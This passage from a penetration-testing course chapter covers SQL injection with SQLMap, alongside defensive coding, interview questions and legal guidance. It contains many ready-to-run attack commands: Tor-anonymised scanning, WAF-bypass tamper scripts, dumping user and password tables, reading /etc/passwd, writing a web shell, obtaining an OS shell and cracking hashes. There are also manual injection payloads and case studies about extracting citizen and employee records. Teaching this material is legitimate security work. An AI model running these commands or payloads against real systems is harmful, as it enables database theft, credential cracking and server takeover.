- [ ] Cookie/header injection
- [ ] WAF bypass techniques
- [ ] Blind SQL injection handling

### Practical Applications
- [ ] Web application security testing
- [ ] Database security assessment
- [ ] Penetration testing workflows
- [ ] Vulnerability documentation

### Best Practices Adopted
- [ ] Always obtain authorization
- [ ] Use --batch for non-destructive testing
- [ ] Document all findings
- [ ] Apply responsible disclosure
- [ ] Stay within defined scope

---

## 💡 PRO TIPS - Master SQLMap Like a Pro!

### Tip 1: Always Use Tor for Anonymous Scanning
```bash
# Install Tor
pkg install tor

# Start Tor service
tor &

# Run SQLMap through Tor
sqlmap -u "http://target.com/page?id=1" --tor --tor-type=SOCKS5 --batch
```

### Tip 2: Resume Interrupted Scans
```bash
# SQLMap saves progress automatically
# Resume with same command - it will restore session
sqlmap -u "http://target.com/page?id=1" --resume
```

### Tip 3: Use Multiple Tamper Scripts
```bash
# Combine multiple tampers for better WAF bypass
sqlmap -u "URL" --tamper=space2comment,between,randomcase --batch
```

### Tip 4: Optimize for Speed
```bash
# Increase threads for faster scanning (be careful!)
sqlmap -u "URL" --threads=10 --batch --level=1 --risk=1
```

### Tip 5: Use Request Files from Burp Suite
```bash
# Save request in Burp Suite -> Copy to file
# Run SQLMap with saved request
sqlmap -r burp_request.txt --batch --force-ssl
```

### Tip 6: Test All Parameters Automatically
```bash
# Test ALL parameters without specifying
sqlmap -u "URL" --all --batch
```

### Tip 7: Custom User-Agent Rotation
```bash
# Use random user-agent from file
sqlmap -u "URL" --user-agent="Mozilla/5.0 (Custom)" --batch
# Or use built-in random
sqlmap -u "URL" --random-agent --batch
```

### Tip 8: Second-Order SQL Injection Testing
```bash
# Test for second-order injection
sqlmap -u "URL" --second-url="http://target.com/profile" --batch
```

### Tip 9: Extract Specific Data Efficiently
```bash
# Only extract what you need - faster and stealthier
sqlmap -u "URL" -D db -T users -C "username,password,email" --dump --batch
```

### Tip 10: Check for Database Admin Privileges
```bash
# Check if current user is DBA
sqlmap -u "URL" --is-dba --batch
# If DBA, you can read/write files and execute commands!
```

---

## 🔥 REAL WORLD BUG BOUNTY CASES

### Case Study 1: E-commerce Platform SQL Injection

**Target:** Major e-commerce website with product search functionality

**Discovery Process:**
1. Identified search parameter vulnerable to SQL injection
2. Used SQLMap with level 3, risk 2
3. Found MySQL database backend
4. Enumerated 47 tables containing user data

**Payload:**
```bash
sqlmap -u "https://target.com/search?q=laptop" --level=3 --risk=2 \
       --random-agent --tor --dbs --batch
```

**Result:** $5,000 bounty for critical SQL injection leading to customer data exposure

**Lesson:** Never ignore search parameters - they're often vulnerable!

---

### Case Study 2: Authentication Bypass via SQL Injection

**Target:** Corporate login portal

**Discovery:**
```bash
# Found SQL injection in login form
sqlmap -u "https://target.com/login" \
       --data="username=admin&password=test" \
       -p username --technique=B --batch
```

**Findings:**
- Boolean-based blind injection
- Extracted admin password hash
- Cracked hash with SQLMap's built-in wordlist

**Reward:** $3,000 for authentication bypass vulnerability

---

### Case Study 3: Government Portal SQL Injection

**Target:** Government benefits application portal

**Attack Vector:**
```bash
sqlmap -u "https://portal.gov/app?id=1234" \
       --cookie="session=abc123; role=user" \
       --level=5 --risk=3 --batch \
       --tamper=charencode
```

**Impact:**
- Access to 100,000+ citizen records
- SSN, addresses, income data exposed
- Complete database dump possible

**Responsible Disclosure:** Reported through official security channel, received recognition and substantial reward.

---

## ⚡ QUICK REFERENCE CARD - SQLMap Commands

```
╔══════════════════════════════════════════════════════════════════════════╗
║                     SQLMAP QUICK REFERENCE CARD                           ║
╠══════════════════════════════════════════════════════════════════════════╣
║ TARGET OPTIONS                                                           ║
║ -u "URL"              Target URL                                          ║
║ -r request.txt        Load request from file                             ║
║ -g "dork"             Google dork results as targets                     ║
║ -l log.txt            Parse targets from Burp/WebScarab log             ║
╠══════════════════════════════════════════════════════════════════════════╣
║ ENUMERATION OPTIONS                                                      ║
║ --dbs                 List all databases                                 ║
║ --tables              List tables (-D database)                          ║
║ --columns             List columns (-D db -T table)                      ║
║ --dump                Dump table data                                    ║
║ --dump-all            Dump all tables                                    ║
║ --current-db          Current database name                              ║
║ --current-user        Current database user                              ║
║ --is-dba              Check if DBA privileges                            ║
║ --passwords           Enumerate password hashes                          ║
║ --privileges          Enumerate user privileges                          ║
╠══════════════════════════════════════════════════════════════════════════╣
║ TECHNIQUE OPTIONS                                                        ║
║ --technique=B         Boolean-based blind                                ║
║ --technique=E         Error-based                                        ║
║ --technique=U         Union-based                                        ║
║ --technique=T         Time-based blind                                   ║
║ --technique=S         Stacked queries                                    ║
╠══════════════════════════════════════════════════════════════════════════╣
║ INJECTION OPTIONS                                                        ║
║ -p parameter          Test specific parameter                            ║
║ --cookie="id=1*"      Cookie injection (* marks injection point)        ║
║ --headers="X-Forwarded-For: 127.0.0.1*"   Header injection              ║
║ --data="user=admin"   POST data injection                                ║
╠══════════════════════════════════════════════════════════════════════════╣
║ OPTIMIZATION OPTIONS                                                     ║
║ --threads=10          Concurrent threads                                 ║
║ --level=1-5           Test level (default 1)                             ║
║ --risk=1-3            Risk level (default 1)                             ║
║ --batch               Non-interactive mode                               ║
║ --random-agent        Random User-Agent                                  ║
╠══════════════════════════════════════════════════════════════════════════╣
║ WAF BYPASS OPTIONS                                                       ║
║ --tamper=space2comment    Space to /**/ bypass                          ║
║ --tamper=between          Replace > with NOT BETWEEN                     ║
║ --tamper=randomcase       Randomize case                                 ║
║ --tamper=charencode       URL encode                                     ║
╠══════════════════════════════════════════════════════════════════════════╣
║ FILE SYSTEM ACCESS                                                       ║
║ --file-read="/etc/passwd"   Read file                                    ║
║ --file-write="shell.php"    Write file                                   ║
║ --os-shell                  Get OS shell (if DBA)                        ║
╚══════════════════════════════════════════════════════════════════════════╝
```

---

## 🏆 BONUS CONTENT - Advanced SQLMap Exploitation

### Advanced Technique 1: OS Shell via SQL Injection

```bash
# If you have DBA privileges, you can get OS shell
sqlmap -u "URL" --os-shell --batch

# SQLMap will:
# 1. Upload web shell via database
# 2. Provide interactive shell access
```

### Advanced Technique 2: Reading Local Files

```bash
# Read files from server
sqlmap -u "URL" --file-read="/etc/passwd" --batch
sqlmap -u "URL" --file-read="/var/www/html/config.php" --batch
```

### Advanced Technique 3: Writing Web Shells

```bash
# Write web shell to web root
sqlmap -u "URL" --file-write="shell.php" \
       --file-dest="/var/www/html/shell.php" --batch
```

### Advanced Technique 4: Registry Access (Windows)

```bash
# Read Windows registry
sqlmap -u "URL" --reg-read \
       --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" \
       --reg-value="ProductName" --batch
```

### Advanced Technique 5: Database Privilege Escalation

```bash
# Check for UDF (User Defined Function) injection
sqlmap -u "URL" --udf-inject --batch

# Privilege escalation via DLL injection on Windows
sqlmap -u "URL" --priv-esc --batch
```

### Advanced Technique 6: Automated Password Cracking

```bash
# SQLMap can crack hashes automatically
sqlmap -u "URL" --passwords --batch

# Use custom wordlist
sqlmap -u "URL" --passwords --wordlist=/path/to/wordlist.txt --batch
```

---

## 📝 CHAPTER SUMMARY - Key Takeaways

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    CHAPTER 34 ESSENTIAL TAKEAWAYS                        │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  1. SQL Injection = Critical Web Vulnerability                           │
│     • OWASP Top 10 #3 position                                          │
│     • Can lead to complete database compromise                           │
│     • Types: In-band, Blind, Out-of-band                                │
│                                                                          │
│  2. SQLMap = Automated SQL Injection Tool                                │
│     • Supports MySQL, PostgreSQL, MSSQL, Oracle, SQLite                 │
│     • Automatic detection and exploitation                              │
│     • Free, open-source, cross-platform                                 │
│                                                                          │
│  3. Key Workflow                                                         │
│     • Detect injection → Enumerate → Extract → Escalate                 │
│     • Always use --batch for automation                                 │
│     • Start with low level/risk, increase as needed                     │
│                                                                          │
│  4. Essential Commands                                                   │
│     • sqlmap -u "URL" --dbs --batch                                     │
│     • sqlmap -u "URL" -D db -T table --dump --batch                     │
│     • sqlmap -r request.txt --batch                                     │
│                                                                          │
│  5. Legal & Ethical                                                      │
│     • Only test authorized targets                                      │
│     • Practice on DVWA, bWAPP, PortSwigger                              │
│     • Report vulnerabilities responsibly                                 │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 🛡️ DEFENSIVE SECURITY - Protecting Against SQL Injection

### Prevention Strategies for Developers

#### 1. Use Parameterized Queries (Prepared Statements)

**Vulnerable Code (PHP):**
```php
// BAD - Direct string concatenation
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
$result = mysqli_query($conn, $query);
```

**Secure Code:**
```php
// GOOD - Parameterized query
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $_GET['id']);
$stmt->execute();
```

#### 2. Input Validation & Sanitization

```php
// Validate input type
if (!is_numeric($_GET['id'])) {
    die("Invalid ID");
}

// Use allow-list validation
$allowed_columns = ['name', 'email', 'phone'];
$column = in_array($_GET['sort'], $allowed_columns) ? $_GET['sort'] : 'name';
```

#### 3. Use ORM (Object-Relational Mapping)

```python
# SQLAlchemy - Safe by default
user = session.query(User).filter(User.id == user_id).first()

# Django ORM - Safe
user = User.objects.get(id=user_id)
```

#### 4. Principle of Least Privilege

```sql
-- Create application user with limited privileges
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE ON webapp_db.* TO 'webapp'@'localhost';
-- Do NOT grant DROP, DELETE, or FILE privileges
```

#### 5. Web Application Firewall (WAF) Rules

```nginx
# ModSecurity WAF rule example
SecRule ARGS "@detectSQLi" \
    "id:1001,phase:2,deny,status:403,msg:'SQL Injection Detected'"
```

#### 6. Error Handling

```php
// Don't expose database errors to users
try {
    $result = $conn->query($query);
} catch (Exception $e) {
    error_log($e->getMessage());  // Log internally
    die("An error occurred. Please try again.");  // Generic message
}
```

### Security Testing Checklist

| Check | Status |
|-------|--------|
| All inputs validated? | ☐ |
| Parameterized queries used? | ☐ |
| Error messages sanitized? | ☐ |
| Database privileges limited? | ☐ |
| WAF rules configured? | ☐ |
| Regular security audits? | ☐ |
| Input length limits set? | ☐ |
| Stored procedures used where appropriate? | ☐ |

---

## 📋 METHODOLOGY - SQL Injection Attack Workflow

```
┌─────────────────────────────────────────────────────────────────────────┐
│                 SQL INJECTION TESTING METHODOLOGY                         │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  PHASE 1: RECONNAISSANCE                                                 │
│  ─────────────────────────                                               │
│  • Identify all input points (URL params, forms, cookies, headers)      │
│  • Map application structure and functionality                           │
│  • Identify technology stack (database type, web server, language)      │
│                                                                          │
│  PHASE 2: DETECTION                                                      │
│  ─────────────────────                                                   │
│  • Manual testing with payloads: ' " OR AND -- /*                       │
│  • Error message analysis                                                │
│  • Boolean condition testing                                             │
│  • Time-based testing                                                    │
│  • Automated scanning with SQLMap                                        │
│                                                                          │
│  PHASE 3: FINGERPRINTING                                                 │
│  ──────────────────────                                                  │
│  • Determine database type (MySQL, MSSQL, PostgreSQL, etc.)             │
│  • Identify database version                                             │
│  • Enumerate user privileges                                             │
│                                                                          │
│  PHASE 4: DATA EXTRACTION                                                │
│  ────────────────────────                                                │
│  • List databases → Tables → Columns → Data                             │
│  • Extract credentials and sensitive data                               │
│  • Document findings                                                     │
│                                                                          │
│  PHASE 5: POST-EXPLOITATION (If authorized)                              │
│  ────────────────────────────────────────                                │
│  • File read/write operations                                            │
│  • OS command execution                                                  │
│  • Privilege escalation                                                  │
│  • Lateral movement                                                      │
│                                                                          │
│  PHASE 6: REPORTING                                                      │
│  ─────────────────                                                       │
│  • Document all vulnerabilities                                          │
│  • Provide proof of concept                                              │
│  • Recommend remediation steps                                           │
│  • Responsible disclosure                                                │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## ⚠️ LEGAL & ETHICS - Critical Guidelines

### Authorization Requirements

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    LEGAL REQUIREMENTS                                    │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ✅ ALWAYS GET WRITTEN AUTHORIZATION                                     │
│     • Signed contract or letter of authorization                        │
│     • Clearly defined scope of testing                                  │
│     • Time window for testing                                           │
│     • Emergency contact information                                     │
│                                                                          │
│  ❌ NEVER TEST WITHOUT PERMISSION                                        │
│     • Unauthorized testing is ILLEGAL                                   │
│     • Can result in criminal charges                                    │
│     • Civil lawsuits for damages                                        │
│     • Permanent criminal record                                         │
│                                                                          │
│  📋 BUG BOUNTY PROGRAMS                                                   │
│     • Read program rules carefully                                      │
│     • Stay within defined scope                                         │
│     • Don't test endpoints not in scope                                 │
│     • Report responsibly                                                │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### Responsible Disclosure Timeline

```
Day 0    → Discover vulnerability
Day 0-1  → Document findings thoroughly
Day 1    → Report to vendor/organization privately
Day 1-7  → Wait for acknowledgment
Day 7-30 → Allow reasonable time for fix
Day 30   → Follow up if no response
Day 90   → Consider coordinated disclosure
         → Never exploit or share publicly before fix
```

### Legal Framework References

| Region | Law | Penalty |
|--------|-----|---------|
| USA | Computer Fraud and Abuse Act (CFAA) | Up to 10 years prison |
| India | IT Act Sections 43, 66, 66A | Up to 3 years prison + fine |
| EU | GDPR (data breach) | Up to €20M or 4% revenue |
| UK | Computer Misuse Act | Up to 10 years prison |

---

## 🔗 RELATED CHAPTERS - Cross-References

| Chapter | Topic | Relation |
|---------|-------|----------|
| Ch-25 | Nmap Network Scanning | Identify targets before SQL testing |
| Ch-35 | Metasploit Framework | Combine with SQL injection for exploitation |
| Ch-36 | PhoneSploit & ADB | Mobile app SQL injection testing |
| Ch-37 | Social Engineering Toolkit | Phishing for credentials + SQL injection |
| Ch-38 | WiFi Security Tools | Intercept SQL traffic on network |
| Ch-39 | Burp Suite | Manual SQL injection testing |
| Ch-40 | OWASP Top 10 | SQL injection is #3 in OWASP |
| Ch-41 | Web Application Penetration Testing | Complete web testing methodology |
| Ch-42 | Bug Bounty Hunting | SQL injection for bug bounty |
| Ch-43 | Penetration Testing Report | Document SQL injection findings |

### Skill Progression Path

```
SQLMap Basics (Ch-34)
        ↓
Manual SQL Injection Testing (Ch-39)
        ↓
Web Application Pen Testing (Ch-41)
        ↓
Bug Bounty Hunting (Ch-42)
        ↓
Advanced Database Exploitation
```

---

**🔥 CHAPTER 34 POWER UPGRADE COMPLETE! 🔥**

*Master SQLMap. Secure the Web. Hack Responsibly.*


---

## 🎯 INTERVIEW QUESTIONS - Job Preparation

### Q1: What is SQL injection and how does it work?
<details>
<summary>📋 Click for Answer</summary>

**SQL Injection** is a code injection technique that exploits vulnerabilities in an application's database layer.

**How it works:**
1. Application accepts user input
2. Input is concatenated into SQL query without sanitization
3. Attacker injects malicious SQL code
4. Database executes the modified query
5. Attacker gains unauthorized access to data

**Example:**
```sql
-- Normal query
SELECT * FROM users WHERE username='admin' AND password='password'

-- Injected query (input: admin'--)
SELECT * FROM users WHERE username='admin'--' AND password='password'
-- Comment ignores password check!
```

**Impact:**
- Data theft
- Authentication bypass
- Data modification/deletion
- Server compromise
</details>

### Q2: What are the different types of SQL injection?
<details>
<summary>📋 Click for Answer</summary>

**1. In-Band SQLi (Most Common):**
- **Error-based:** Information from database errors
- **Union-based:** Using UNION to retrieve data

**2. Blind SQLi:**
- **Boolean-based:** True/False conditions
- **Time-based:** Response delays (SLEEP, WAITFOR)

**3. Out-of-Band SQLi:**
- Uses different channel (DNS, HTTP requests)
- Rare but effective

**Detection Methods:**
```
In-Band: ' OR '1'='1
Boolean: ' AND 1=1-- (true) vs ' AND 1=2-- (false)
Time: ' AND SLEEP(5)--
```
</details>

### Q3: How does SQLMap detect and exploit SQL injection?
<details>
<summary>📋 Click for Answer</summary>

**Detection Process:**
1. **Fuzzing:** Injects various payloads
2. **Analysis:** Compares responses
3. **Identification:** Determines injection type
4. **Exploitation:** Automated data extraction

**SQLMap Techniques:**
```bash
# Level controls number of tests
sqlmap -u "url" --level=5

# Risk controls aggressiveness
sqlmap -u "url" --risk=3

# Technique selection
sqlmap -u "url" --technique=BEU  # Boolean, Error, Union
```

**Technique Codes:**
- B: Boolean-based blind
- E: Error-based
- U: Union query-based
- S: Stacked queries
- T: Time-based blind
- Q: Inline queries
</details>

### Q4: What is the difference between UNION-based and Boolean-based SQL injection?
<details>
<summary>📋 Click for Answer</summary>

**UNION-Based:**
- Uses UNION SELECT to combine results
- Direct data extraction visible in output
- Requires matching column count
- Faster exploitation

```sql
' UNION SELECT username,password FROM users--
```

**Boolean-Based:**
- Infers data from true/false responses
- One bit at a time extraction
- Slower but works without visible output
- Based on conditional responses

```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

**SQLMap Handling:**
```bash
# UNION-based
sqlmap -u "url" --technique=U

# Boolean-based
sqlmap -u "url" --technique=B
```
</details>

### Q5: How do you prevent SQL injection?
<details>
<summary>📋 Click for Answer</summary>

**1. Parameterized Queries (Prepared Statements):**
```python
# SAFE - Parameterized
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# UNSAFE - String concatenation
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
```

**2. Input Validation:**
```php
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
```

**3. Stored Procedures:**
```sql
CREATE PROCEDURE GetUser(@id INT)
AS
SELECT * FROM users WHERE id = @id
```

**4. ORM Usage:**
```python
# Django ORM (safe)
User.objects.filter(id=user_id)
```

**5. Web Application Firewall (WAF):**
- ModSecurity
- AWS WAF
- Cloudflare

**6. Least Privilege:**
- Application accounts with minimal permissions
- No DROP/CREATE privileges
</details>

### Q6: What is the difference between --level and --risk in SQLMap?
<details>
<summary>📋 Click for Answer</summary>

**--level (1-5):**
- Controls number of tests/payloads
- Higher = more injection points tested
- Level 1: Basic tests
- Level 5: Tests cookies, headers, all parameters

**--risk (1-3):**
- Controls payload aggressiveness
- Higher = potentially damaging payloads
- Risk 1: Safe tests
- Risk 3: May cause data modification

**Usage:**
```bash
# Quick test
sqlmap -u "url" --level=1 --risk=1

# Thorough test
sqlmap -u "url" --level=5 --risk=3

# Production-safe test
sqlmap -u "url" --level=3 --risk=1
```

**Caution:** High risk can damage databases!
</details>

### Q7: How do you use SQLMap for POST requests?
<details>
<summary>📋 Click for Answer</summary>

**Method 1: --data flag:**
```bash
sqlmap -u "http://target.com/login" \
       --data="username=admin&password=test" \
       --batch
```

**Method 2: Request file:**
```bash
# Save request from Burp to request.txt
sqlmap -r request.txt --batch
```

**Method 3: Specify parameter:**
```bash
sqlmap -u "http://target.com/login" \
       --data="username=admin&password=test" \
       -p username \
       --batch
```

**JSON data:**
```bash
sqlmap -u "http://target.com/api" \
       --data='{"id":1}' \
       --headers="Content-Type: application/json" \
       --batch
```
</details>

### Q8: What is tamper scripts in SQLMap and give examples?
<details>
<summary>📋 Click for Answer</summary>

**Tamper Scripts:** Modify payloads to bypass WAF/filters.

**Common Tamper Scripts:**
```bash
# Space to comment (bypass space filtering)
sqlmap -u "url" --tamper=space2comment

# Between (bypass = filtering)
sqlmap -u "url" --tamper=between

# Random case (bypass case-sensitive filters)
sqlmap -u "url" --tamper=randomcase

# Combine multiple tampers
sqlmap -u "url" --tamper=space2comment,between,randomcase
```

**Custom Tamper:**
```python
# /usr/share/sqlmap/tamper/mytamper.py
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    return payload.replace("SELECT", "SeLeCt")
```
</details>

### Q9: How do you dump credentials from a database using SQLMap?
<details>
<summary>📋 Click for Answer</summary>

**Step-by-Step:**

```bash
# 1. List databases
sqlmap -u "url" --dbs --batch

# 2. List tables in specific database
sqlmap -u "url" -D database_name --tables --batch

# 3. List columns in specific table
sqlmap -u "url" -D database_name -T users --columns --batch

# 4. Dump specific columns
sqlmap -u "url" -D database_name -T users \
       -C "username,password" --dump --batch

# 5. Dump entire table
sqlmap -u "url" -D database_name -T users --dump --batch

# 6. Dump all databases
sqlmap -u "url" --dump-all --batch
```

**Password Hash Cracking:**
SQLMap can automatically crack password hashes with `--passwords` flag.
</details>

### Q10: What are the legal implications of SQL injection testing?
<details>
<summary>📋 Click for Answer</summary>

**Legal Framework:**

| Region | Law | Penalty |
|--------|-----|---------|
| USA | CFAA | Up to 10 years |
| UK | Computer Misuse Act | Up to 10 years |
| India | IT Act 66 | Up to 3 years |
| EU | GDPR | Up to €20M |

**Authorized Testing Requirements:**
1. Written permission from owner
2. Defined scope
3. Rules of engagement
4. Incident response plan

**Safe Testing Options:**
- DVWA (Damn Vulnerable Web Application)
- bWAPP
- OWASP Juice Shop
- HackTheBox
- PortSwigger Web Academy

**Important:**
- Never test without authorization
- Document everything
- Report findings responsibly
- Follow coordinated disclosure
</details>

---

## 🔥 REAL-WORLD SCENARIOS

### Scenario 1: Bug Bounty SQL Injection Hunt
```
╔═══════════════════════════════════════════════════════════════════════════╗
║                     BUG BOUNTY SQL INJECTION HUNT                           ║
╠═══════════════════════════════════════════════════════════════════════════╣
║                                                                            ║
║  TARGET: E-commerce website with product search functionality             ║
║                                                                            ║
║  RECONNAISSANCE:                                                            ║
║  • Identified search parameter: ?search=laptop                              ║
║  • Tested with single quote: ?search=laptop'                               ║
║  • Received SQL error message                                               ║
║                                                                            ║
║  SQLMap COMMANDS:                                                           ║
║  # Basic detection                                                          ║
║  sqlmap -u "https://shop.com/search?search=laptop" --batch                 ║
║                                                                             ║
║  # Confirm with level 3                                                     ║
║  sqlmap -u "https://shop.com/search?search=laptop" --level=3 --batch       ║
║                                                                             ║
║  # Enumerate databases                                                      ║
║  sqlmap -u "https://shop.com/search?search=laptop" --dbs --batch           ║
║                                                                             ║
║  FINDINGS:                                                                  ║
║  • Time-based blind SQL injection confirmed                                ║
║  • Found 2 databases: shop_db, users_db                                    ║
║  • Table 'customers' contains PII                                          ║
║                                                                            ║
║  RESPONSIBLE DISCLOSURE:                                                    ║
║  • Did NOT dump any customer data                                          ║
║  • Documented proof of concept                                             ║
║  • Reported to bug bounty program                                          ║
║  • Received $5000 bounty                                                   ║
║                                                                            ║
╚═══════════════════════════════════════════════════════════════════════════╝
```

### Scenario 2: Internal Penetration Test
```
╔═══════════════════════════════════════════════════════════════════════════╗
║                    INTERNAL PENETRATION TEST                                ║
╠═══════════════════════════════════════════════════════════════════════════╣
║                                                                            ║
║  ENGAGEMENT: Annual security assessment for financial company              ║
║                                                                            ║
║  SCOPE: Internal web applications only                                     ║
║                                                                            ║
║  TARGET: Internal HR portal (hr.internal.company.com)                      ║
║                                                                            ║
║  APPROACH:                                                                  ║
║  # Step 1: Reconnaissance                                                  ║
║  nmap -sV -p 80,443,8080 hr.internal.company.com                           ║
║                                                                             ║
║  # Step 2: Manual testing                                                  ║
║  Burp Suite interception of login request                                  ║
║  Saved request to login_request.txt                                        ║
║                                                                             ║
║  # Step 3: SQLMap testing                                                  ║
║  sqlmap -r login_request.txt --batch --level=3                             ║
║                                                                             ║
║  # Step 4: Exploitation (if found)                                         ║
║  sqlmap -r login_request.txt --dbs --batch                                 ║
║  sqlmap -r login_request.txt -D hr_db --tables --batch                     ║
║  sqlmap -r login_request.txt -D hr_db -T employees --dump --batch          ║
║                                                                            ║
║  FINDINGS:                                                                  ║
║  • UNION-based SQLi in employee search                                     ║
║  • 5000+ employee records exposed                                          ║
║  • Passwords stored in plain text                                          ║
║                                                                            ║
║  REMEDIATION:                                                               ║
║  • Immediate patching required                                             ║
║  • Parameterized queries implementation                                    ║
║  • Password hashing (bcrypt)                                               ║
║  • WAF deployment                                                          ║
║                                                                            ║
╚═══════════════════════════════════════════════════════════════════════════╝
```

### Scenario 3: CTF Challenge
```
╔═══════════════════════════════════════════════════════════════════════════╗
║                         CTF CHALLENGE                                       ║
╠═══════════════════════════════════════════════════════════════════════════╣
║                                                                            ║
║  CHALLENGE: "Find the flag in the database"                                ║
║                                                                            ║
║  GIVEN:                                                                     ║
║  • URL: http://ctf.challenge.com/vulnerable.php?id=1                       ║
║  • Hint: "The flag is in the secrets table"                                ║
║                                                                            ║
║  APPROACH:                                                                  ║
║  # Quick detection                                                          ║
║  sqlmap -u "http://ctf.challenge.com/vulnerable.php?id=1" --batch          ║
║                                                                             ║
║  # Found: Boolean-based blind SQLi                                         ║
║                                                                             ║
║  # Enumerate databases                                                      ║
║  sqlmap -u "url" --dbs --batch                                             ║
║  # Output: ctf_db                                                           ║
║                                                                             ║
║  # List tables                                                              ║
║  sqlmap -u "url" -D ctf_db --tables --batch                                ║
║  # Output: secrets, users, products                                        ║
║                                                                             ║
║  # Dump secrets table                                                       ║
║  sqlmap -u "url" -D ctf_db -T secrets --dump --batch                       ║
║                                                                             ║
║  FLAG FOUND: CTF{sql_m4st3r_2024}                                          ║
║                                                                            ║
║  TIME: 3 minutes 22 seconds                                                ║
║                                                                            ║
╚═══════════════════════════════════════════════════════════════════════════╝
```

### Scenario 4: Mobile App API Testing
```
╔═══════════════════════════════════════════════════════════════════════════╗
║                     MOBILE APP API TESTING                                  ║
╠═══════════════════════════════════════════════════════════════════════════╣
║                                                                            ║
║  TARGET: Mobile banking app REST API                                       ║
║                                                                            ║
║  SETUP:                                                                     ║
║  • Intercept app traffic with Burp Suite                                   ║
║  • Identify API endpoint: /api/v1/transactions?user_id=123                ║
║  • Save request to api_request.txt                                         ║
║                                                                            ║
║  TESTING:                                                                   ║
║  # Test with SQLMap                                                        ║
║  sqlmap -r api_request.txt --batch --level=5                               ║
║                                                                             ║
║  # With authentication token                                               ║
║  sqlmap -r api_request.txt \                                               ║
║         --headers="Authorization: Bearer TOKEN" \                          ║
║         --batch                                                            ║
║                                                                             ║
║  # Test specific parameter                                                  ║
║  sqlmap -r api_request.txt -p user_id --batch                              ║
║                                                                            ║
║  FINDINGS:                                                                  ║
║  • No SQL injection in user_id parameter                                   ║
║  • Found SQLi in search parameter (secondary endpoint)                     ║
║  • Sensitive data exposure via API                                         ║
║                                                                            ║
║  RECOMMENDATIONS:                                                           ║
║  • Input validation on all API parameters                                  ║
║  • Rate limiting implementation                                            ║
║  • API key rotation mechanism                                              ║
║  • Parameterized queries                                                   ║
║                                                                            ║
╚═══════════════════════════════════════════════════════════════════════════╝
```

### Scenario 5: WAF Bypass Challenge
```
╔═══════════════════════════════════════════════════════════════════════════╗
║                      WAF BYPASS CHALLENGE                                   ║
╠═══════════════════════════════════════════════════════════════════════════╣
║                                                                            ║
║  SITUATION:                                                                 ║
║  Target has Web Application Firewall (WAF) blocking SQLMap requests        ║
║                                                                            ║
║  INITIAL ATTEMPT:                                                           ║
║  sqlmap -u "https://target.com/page?id=1" --batch                          ║
║  # Result: 403 Forbidden (WAF blocked)                                     ║
║                                                                            ║
║  BYPASS TECHNIQUES:                                                         ║
║                                                                             ║
║  # Technique 1: Tamper scripts                                             ║
║  sqlmap -u "url" --tamper=space2comment,between --batch                    ║
║                                                                             ║
║  # Technique 2: Random User-Agent                                          ║
║  sqlmap -u "url" --random-agent --batch                                    ║
║                                                                             ║
║  # Technique 3: Delay between requests                                     ║
║  sqlmap -u "url" --delay=5 --batch                                         ║
║                                                                             ║
║  # Technique 4: Custom headers                                             ║
║  sqlmap -u "url" --headers="X-Forwarded-For: 127.0.0.1" --batch            ║
║                                                                             ║
║  # Technique 5: HTTP methods                                               ║
║  sqlmap -u "url" --method=POST --data="id=1" --batch                       ║
║                                                                             ║
║  # Technique 6: Chunked encoding                                           ║
║  sqlmap -u "url" --chunked --batch                                         ║
║                                                                            ║
║  SUCCESSFUL BYPASS:                                                         ║
║  Combination of tamper + random-agent + delay                              ║
║                                                                            ║
║  COMMAND THAT WORKED:                                                       ║
║  sqlmap -u "url" --tamper=space2comment \                                  ║
║         --random-agent --delay=3 --batch                                    ║
║                                                                            ║
╚═══════════════════════════════════════════════════════════════════════════╝
```

---

## ⚠️ SECURITY BEST PRACTICES

### ✅ DO's - Ethical SQL Injection Testing

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         SECURITY DO's                                        │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ✅ ALWAYS get written authorization before testing                         │
│  ✅ TEST only in defined scope                                              │
│  ✅ USE designated testing environments when available                      │
│  ✅ DOCUMENT all findings for reporting                                     │
│  ✅ NOTIFY stakeholders immediately if critical data exposed                │
│  ✅ FOLLOW responsible disclosure practices                                 │
│  ✅ CLEAN UP any test data created                                         │
│  ✅ PROOF of concept only, limit data extraction                           │
│  ✅ USE --batch for automated decisions                                     │
│  ✅ START with low level/risk, increase as needed                           │
│  ✅ VERIFY with multiple techniques                                         │
│  ✅ REPORT with remediation recommendations                                 │
│                                                                              │
│  BEST PRACTICE: When in doubt, ask permission first                         │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### ❌ DON'Ts - Avoid These Mistakes

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                         SECURITY DON'Ts                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ❌ NEVER test websites without authorization                              │
│  ❌ NEVER dump complete databases unless required                          │
│  ❌ NEVER exfiltrate real user data                                        │
│  ❌ NEVER use --risk=3 on production systems                               │
│  ❌ NEVER share vulnerabilities publicly before patch                       │
│  ❌ NEVER attempt to modify/delete data                                    │
│  ❌ NEVER run automated scans during peak hours                            │
│  ❌ NEVER ignore rate limiting signs                                       │
│  ❌ NEVER test third-party hosted applications                            │
│  ❌ NEVER use default settings on critical systems                         │
│  ❌ NEVER forget to save evidence                                          │
│  ❌ NEVER test outside engagement window                                   │
│                                                                              │
│  WARNING: SQL injection testing on unauthorized systems is illegal          │
│           and can result in severe criminal penalties                       │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

